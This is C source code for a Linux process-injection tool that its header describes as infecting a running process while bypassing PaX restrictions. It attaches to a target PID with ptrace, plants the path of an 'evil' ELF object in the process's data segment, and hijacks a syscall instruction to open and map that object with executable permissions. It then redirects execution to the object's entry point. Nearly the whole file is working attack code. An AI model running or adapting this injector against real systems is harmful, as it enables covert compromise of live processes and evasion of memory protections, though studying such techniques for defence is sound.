/* Program to infect running process
 * while bypassing pax restrictions
 * modified code from Elfmaster
 *
 * https://github.com/elfmaster/packt_book/blob/master/code_inject.c
 * http://vxer.org/lib/vrn00.html
 *
 * Buy his book! 
 * Learning Linux Binary Analysis PACKT publishing
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>


typedef struct handle {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Shdr *shdr;
	uint8_t *mem;
	pid_t pid;
	size_t size;
	uint8_t *shellcode;
	char *exec_path;
	uint64_t base;
	uint64_t data_base;
	uint64_t stack;
	uint64_t entry;
	struct user_regs_struct pt_reg;
} handle_t;

uint64_t get_text_base(pid_t);
int pid_write(int, void *, const void *, size_t);

#define MAX_PATH 512

uint64_t get_text_base(pid_t pid)
{
	char maps[MAX_PATH], line[256];
	char *start, *p;
	FILE *fd;
	int i;
	Elf64_Addr base;
	snprintf(maps, MAX_PATH - 1 , "/proc/%d/maps", pid);
	if ((fd = fopen(maps, "r")) == NULL) {
		fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
		return 1;
	}

	while (fgets(line, sizeof(line), fd))
	{
		if (!strstr(line, "r-xp"))
			continue;
		/* do this on the stack ? */

		for (i = 0, start = alloca(32), p = line; *p != '-'; i++, p++)
			start[i] = *p;
		start[i] = '\0';
		base = strtoul(start, NULL, 16);
		break;
	}
	fclose(fd);
	return base;
}

uint64_t get_data_base(pid_t pid)
{
	char maps[MAX_PATH], line[256];
	char *start, *p;
	FILE *fd;
	int i;
	Elf64_Addr base;
	snprintf(maps, MAX_PATH - 1 , "/proc/%d/maps", pid);
	if ((fd = fopen(maps, "r")) == NULL) {
		fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
		return 1;
	}

	while (fgets(line, sizeof(line), fd))
	{
		if (!strstr(line, "rw-p"))
			continue;
		/* do this on the stack ? */

		for (i = 0, start = alloca(32), p = line; *p != '-'; i++, p++)
			start[i] = *p;
		start[i] = '\0';
		base = strtoul(start, NULL, 16);
		break;
	}
	fclose(fd);
	return base;
}

int pid_read(int pid, void *dst, const void *src, size_t len)
{
	int sz = len / sizeof(void *);
//	printf("len: %lu sz: %d\n", len, sz);
	unsigned char *s = (unsigned char *)src;
	unsigned char *d = (unsigned char *)dst;
	long word;
	while (sz-- != 0)
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
		printf("read: 0x%016lx\n", word);
		if (word == -1 && errno)
		{
			fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
			goto fail;
		}
		*(long *)d = word;
		s += sizeof(long);
		d += sizeof(long);
	}
	return 0;
fail:
	perror("PTRACE_PEEKTEXT");
	return -1;
}

/* need this to write filename string */
int pid_write_char(int pid, void *dest, const void *src, size_t len)
{
	size_t quot = len /sizeof(void *);
	char *s = src;
	char *d = dest;

	while (len-- != 0)
	{
		printf("write addr: 0x%lx val: %lx\n", d, *s);
		if (ptrace(PTRACE_POKETEXT, pid, d, *s) == -1)
			goto out_error;

		s++;
		d++;
	}
	return 0;

out_error:
	perror("PTRACE_POKETEXT");
	return -1;
}

int pid_write(int pid, void *dest, const void *src, size_t len)
{
	size_t quot = len /sizeof(void *);
	unsigned char *s = (unsigned char *)src;
	unsigned char *d = (unsigned char *)dest;

	while (quot-- != 0)
	{
		printf("write addr: 0x%lx val: %lx\n", d, *(void **)s);
		if (ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == -1)
			goto out_error2;

	//	s++;
	//	d++;
		s += sizeof(void *);
		d += sizeof(void *);
	}
	return 0;

out_error2:
	perror("PTRACE_POKETEXT");
	return -1;
}
int two_step(handle_t *h)
{
	int call, result, status;
	call = h->pt_reg.rax;
	result = ptrace(PTRACE_SETREGS, h->pid, NULL, &h->pt_reg);
	if (result < 0)
	{
		perror("setregs");
		return -1;
	}
	result = ptrace(PTRACE_GETREGS, h->pid, NULL, &h->pt_reg);
	if (result < 0)
	{
		perror("getregs");
		return -1;
	}


	result = ptrace(PTRACE_SINGLESTEP, h->pid, NULL, NULL);
	if (result < 0)
	{
		perror("PTRACE_SINGLESTEP");
		return -1;
	}
	wait(NULL);
	result = ptrace(PTRACE_GETREGS, h->pid, NULL, &h->pt_reg);
	if (result < 0)
	{
		perror("get regs2");
		return -1;
	}
	printf("rdi: %llx\nrdx: %llx\nrsi: %llx\n", h->pt_reg.rdi, h->pt_reg.rdx, h->pt_reg.rsi);
	printf("rax: %llx\n", h->pt_reg.rax);
	printf("rip: %llx\n", h->pt_reg.rip);

	/* reload rax with open call */
	if (call)
		h->pt_reg.rax = call;

	result = ptrace(PTRACE_SETREGS, h->pid, NULL, &h->pt_reg);
	if (result < 0)
	{
		perror("setregs");
		return -1;
	}
	result = ptrace(PTRACE_SINGLESTEP, h->pid, NULL, NULL);
	if (result < 0)
	{
		perror("PTRACE_SINGLESTEP");
		return -1;
	}
	wait(NULL);
	result = ptrace(PTRACE_GETREGS, h->pid, NULL, &h->pt_reg);
	if (result < 0)
	{
		perror("get regs2");
		return -1;
	}
	printf("rdi: %llx\nrdx: %llx\nrsi: %llx\n", h->pt_reg.rdi, h->pt_reg.rdx, h->pt_reg.rsi);
	printf("rip: %llx\n", h->pt_reg.rip);
	printf("r8: %llx\n", h->pt_reg.r8);
	printf("rax: %llx\n", h->pt_reg.rax);
	return 0;
	
}

int main(int argc, char **argv)
{
	handle_t h;
	int i, fd, status, result;
	uint8_t *executable, *origcode;
	struct stat st;
	Elf64_Ehdr *ehdr;
	uint8_t tmp[8192];
	char * mem;
	uint64_t sysenter = 0, evil_entry = 0;

	if (argc < 3)
	{
		printf("Usage: %s <pid> <executable>\n", argv[0]);
		exit(-1);
	}

	h.pid = atoi(argv[1]);
	h.exec_path = strdup(argv[2]);
	/* get payload size */
	if ((fd = open(h.exec_path, O_RDONLY)) < 0)
	{
		perror("open");
		exit(-1);
	}
	if (fstat(fd, &st) < 0)
	{
		perror("fstat");
		exit(-1);
	}
	h.size = st.st_size;

	/* get payload entry */
	mem = mmap(NULL, h.size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem == MAP_FAILED)
	{
		perror("mmap");
		exit(-1);
	}

	ehdr = (Elf64_Ehdr *)mem;
	evil_entry = ehdr->e_entry;
	munmap(mem, h.size);

	close(fd);

	origcode = alloca(sizeof(void *) * 3);

	if (ptrace(PTRACE_ATTACH, h.pid) < 0)
	{
		perror("PTRACE_ATTACH");
		exit(-1);
	}
	wait(NULL);

	h.base = get_text_base(h.pid);
	h.data_base = get_data_base(h.pid);
	/* get path of evil object and write in to data seg */


	/* backup original ds */
	result = pid_read(h.pid, origcode, (uint64_t *)h.data_base, sizeof(void *) * 3);
	if (result < 0)
		exit(-1);
	

	/* write path */
	printf("path: %s\n", h.exec_path);
	result = pid_write_char(h.pid, (uint64_t *)h.data_base, (char *)h.exec_path, strlen(h.exec_path));
	if (result < 0)
		exit(-1);

	if (ptrace(PTRACE_SYSCALL, h.pid, NULL, NULL) == -1)
	{
		perror("PTRACE_SYSCALL");
		exit(-1);
	}
	wait(NULL);

	if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) == -1)
	{
		perror("PTRACE_GETREGS");
		exit(-1);
	}

	uint64_t syscall_rip = h.pt_reg.rip - 40;

	//pid_read(h.pid, (uint64_t *)tmp, (uint64_t *)h.data_base, 8);
	pid_read(h.pid, (uint64_t *)tmp, (uint64_t *)syscall_rip, 40);
	printf("reading 40 bytes of data\n");
	for (i = 0; i < 40; i++)
	{
		//printf("read addr:%lx %.2x\n ", &tmp[i], tmp[i]);
		if (i % 20 == 0)
			printf("\n");
		printf("%.2x ", tmp[i]);
		if (tmp[i] == 0x0f && tmp[i + 1] == 0x05)
		{
			sysenter = syscall_rip + i;
		}
	}
	printf("\n");
	printf("sysenter: %lx\n", syscall_rip+i);
	if (sysenter == 0)
	{
		printf("could not find sysenter\n");
		exit(-1);
	}
	sysenter -= 5;
	/* points to
	 * mov $23, %eax
	 */
	
	result = ptrace(PTRACE_DETACH, h.pid, NULL, NULL);
	if (result < 0)
	{
		perror("PTRACE_DETACH");
		exit(-1);
	}

	result = ptrace(PTRACE_ATTACH, h.pid, NULL, NULL);
	if (result < 0)
	{
		perror("PTRACE_ATTACH");
		exit(-1);
	}

	waitpid(h.pid, &status, WUNTRACED);

	/* load up registers for open */
	h.pt_reg.rax = 2; //open syscall
	h.pt_reg.rdi = h.data_base;
	h.pt_reg.rdx = 0; // mode
	h.pt_reg.rsi = O_RDONLY; // flags
	h.pt_reg.rip = sysenter;
	

	result = two_step(&h);
	if (result < 0)
	{
		printf("something went wrong\n");
		goto out;
	}
	int evil_obj_fd = h.pt_reg.rax;

	/* write back original data segment */
	printf("writing back original data segment.\n");

	result = pid_write(h.pid, (uint64_t *)h.data_base, origcode, sizeof(void *) * 3);
	if (result < 0)
		exit(-1);
	/* load up registers for mmap call */
	h.pt_reg.rax = 9;// mmap
	h.pt_reg.rdi = NULL;  //addr
	h.pt_reg.rsi = 8192; //payload size on page boundry
	h.pt_reg.rdx = PROT_READ|PROT_WRITE|PROT_EXEC; //prot
	h.pt_reg.r10 = MAP_PRIVATE; // flags
	h.pt_reg.r8 = evil_obj_fd; // fd
	h.pt_reg.r9 = 0; // offset
	h.pt_reg.rip = sysenter;

	result = two_step(&h);
	perror("mmap");
	if (result < 0)
	{
		printf("mmap call error.\n");
		goto out;
	}
	uint64_t evil_pointer = h.pt_reg.rax;

	printf("evil code at %lx\n", evil_pointer);
	printf("attempting to run it...\n");

	result = ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg);
	if (result < 0)
	{
		perror("getregs");
		return -1;
	}


	/* jump to injected code */
	h.pt_reg.rip = evil_pointer + evil_entry;

	/* this way we can return */
	result = two_step(&h);
	if (result < 0)
	{
		printf("return call error.\n");
	}
out:

	ptrace(PTRACE_DETACH, h.pid, NULL, NULL);
//	wait(0);
	printf("Success!\n");
	return 0;
}
